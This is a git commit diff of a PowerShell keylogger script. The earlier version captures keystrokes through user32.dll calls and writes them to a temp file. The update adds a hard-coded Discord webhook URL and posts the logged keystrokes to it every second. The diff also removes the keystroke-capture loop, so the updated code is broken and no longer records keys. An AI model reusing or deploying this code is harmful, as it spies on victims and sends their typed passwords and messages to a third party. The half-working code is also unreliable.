7630efbbbed7d69f342ff49b9cce8d0ab765201c
xborz75 <103429301+xborz75@users.noreply.github.com>
2024-02-25 17:11:52 +0100

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,71 +1,48 @@
 #requires -Version 2
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+
+function Start-KeyLogger($Path="$env:temp\keylogger.txt", $WebhookURL="https://discord.com/api/webhooks/1211338209254965258/ZN2Rfn2AO6KKLW5FRl9UXaoqHJv2brSA-G6-L7gS9HKkRCKY2-NG1N7YbXU6ixZ6FzPk") 
 {
-  # Signatures for API Calls
-  $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+    # Signatures for API Calls
+    $signatures = @'
+    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+    public static extern short GetAsyncKeyState(int virtualKeyCode); 
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int GetKeyboardState(byte[] keystate);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int MapVirtualKey(uint uCode, int uMapType);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    # Load signatures and make members available
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-  # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+    # Create output file
+    $null = New-Item -Path $Path -ItemType File -Force
 
-  try
-  {
-    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
+    try
+    {
+        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
-    while ($true) {
-      Start-Sleep -Milliseconds 40
-      
-      # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
+        # Create endless loop. When user presses CTRL+C, finally-block
+        # executes and shows the collected key presses
+        while ($true) {
+            Start-Sleep -Seconds 1
 
-        # is key pressed?
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
+            # Read content of the file
+            $content = Get-Content -Path $Path -Raw
 
-          # translate scan code to real code
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          # get keyboard state for virtual keys
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          # prepare a StringBuilder to receive input key
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-          if ($success) 
-          {
-            # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-          }
+            # Send content to Discord webhook
+            Invoke-RestMethod -Uri $WebhookURL -Method POST -Body "{'content':'$content'}" -ContentType 'application/json'
         }
-      }
     }
-  }
-  finally
-  {
-    # open logger file in Notepad
-    notepad $Path
-  }
+    finally
+    {
+        # Open logger file in Notepad
+        notepad $Path
+    }
 }
 
-# records all key presses until script is aborted by pressing CTRL+C
-# will then open the file with collected key codes
+# Records all key presses until script is aborted by pressing CTRL+C
+# Will then open the file with collected key codes
 Start-KeyLogger
